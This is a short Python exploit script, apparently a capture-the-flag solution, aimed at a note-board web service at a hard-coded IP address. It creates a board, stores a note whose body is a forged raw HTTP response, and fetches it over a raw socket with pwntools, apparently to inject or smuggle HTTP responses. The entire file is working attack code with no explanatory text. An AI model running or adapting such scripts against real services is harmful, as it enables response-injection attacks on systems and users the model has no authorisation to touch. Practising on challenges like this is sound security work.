#!/usr/bin/env python3
import requests
from requests_toolbelt.utils import dump
from pwn import *

WEB_URI = "http://35.224.135.84:3100"
NOTE_URI = "http://35.224.135.84:3101"

def create_board():
    res = requests.get(f"{WEB_URI}/create_board", allow_redirects = False)
    board_id = res.headers['Location'].split("/")[2]
    print(f"board_id: {board_id}")
    return board_id

def add_note(board_id, body):
    data = { "id": board_id, "body": body }
    res = requests.post(f"{WEB_URI}/board/add_note", json = data)
    note_id = res.json()
    print(f"{board_id} note created: {note_id}")
    return note_id

def view_note(board_id, note_id):
    res = requests.get(f"{NOTE_URI}/{board_id}/{note_id}")
    print("="*32)
    print(dump.dump_response(res).decode())
    print("="*32)
    #  text = res.text
    #  print(res.raw.data)
    #  print(f"{board_id}/{note_id}: {text}")


def view_note2(board_id, note_id):
    c = remote('35.224.135.84', 3101)
    c.sendline(f"GET /{board_id}/{note_id}\n")
    print(c.recv().decode(), end='')
    print(c.recv().decode())
    c.close()
    #  http://35.224.135.84:3101"

NOTE_PAYLOAD = """
HTTP/1.1 200 OK
Date: Sun, 13 Jun 2021 16:33:27 GMT
Content-Length: 2
Connection: keep-alive
Content-Type: text/html

<h1>hi</h1>
""".strip("\n")

def exploit():
    board_id = create_board()
    note_id = add_note(board_id, NOTE_PAYLOAD)
    #  board_id = "78221aa9-0a2d-4f7f-bfe1-6d41d7096561"
    #  note_id = "note1"
    view_note2(board_id, note_id)

exploit()
